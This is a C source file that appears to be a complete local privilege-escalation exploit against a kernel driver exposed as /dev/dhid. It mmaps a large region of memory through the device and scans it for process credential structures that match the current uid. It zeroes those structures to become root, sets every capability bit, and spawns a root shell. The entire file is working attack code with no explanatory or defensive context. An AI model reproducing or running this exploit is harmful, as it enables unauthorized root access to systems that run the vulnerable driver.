#include <ctype.h>
#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>

int main(int argc, char * const * argv) {
    printf("[+] PID: %d\n", getpid());
    int fd = open("/dev/dhid", O_RDWR);
    if (fd < 0) {
        printf("[-] Open failed!\n");
        return -1;
    }
    printf("[+] Open OK fd: %d\n", fd);
    unsigned long size = 0xf0000000;
    unsigned long mmapStart = 0x42424000;
    unsigned int * addr = (unsigned int *)mmap((void*)mmapStart, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0x0);
    if (addr == MAP_FAILED) {
        perror("Failed to mmap: ");
        close(fd); return -1;
    }
    printf("[+] mmap OK addr: %lx\n", addr);

    unsigned int uid = getuid();
    printf("[+] UID: %d\n", uid);
    unsigned int credIt = 0;
    unsigned int credNum = 0;
    while (((unsigned long)addr) < (mmapStart + size - 0x40))
    {
        credIt = 0;
        if (
            addr[credIt++] == uid &&
            addr[credIt++] == uid &&
            addr[credIt++] == uid &&
            addr[credIt++] == uid &&
            addr[credIt++] == uid &&
            addr[credIt++] == uid &&
            addr[credIt++] == uid &&
            addr[credIt++] == uid
            )
        {
            credNum++;
            printf("[+] Found cred structure! ptr: %p, credNum: %d\n", addr, credNum);
            credIt = 0;
            addr[credIt++] = 0;
            addr[credIt++] = 0;
            addr[credIt++] = 0;
            addr[credIt++] = 0;
            addr[credIt++] = 0;
            addr[credIt++] = 0;
            addr[credIt++] = 0;
            addr[credIt++] = 0;
            if (getuid() == 0)
            {
                puts("[+] GOT ROOT!");
                credIt += 1; //Skip 4 bytes, to get capabilities
                addr[credIt++] = 0xffffffff;
                addr[credIt++] = 0xffffffff;
                addr[credIt++] = 0xffffffff;
                addr[credIt++] = 0xffffffff;
                addr[credIt++] = 0xffffffff;
                addr[credIt++] = 0xffffffff;
                addr[credIt++] = 0xffffffff;
                addr[credIt++] = 0xffffffff;
                addr[credIt++] = 0xffffffff;
                addr[credIt++] = 0xffffffff;
                execl("/bin/sh", "-", (char *)NULL);
                puts("[-] Execl failed...");
                break;
            }
            else
            {
                credIt = 0;
                addr[credIt++] = uid;
                addr[credIt++] = uid;
                addr[credIt++] = uid;
                addr[credIt++] = uid;
                addr[credIt++] = uid;
                addr[credIt++] = uid;
                addr[credIt++] = uid;
                addr[credIt++] = uid;
            }
        }
        addr++;
    }

    puts("[+] Scanning loop END");
    fflush(stdout);

    int stop = getchar();
    return 0;
}
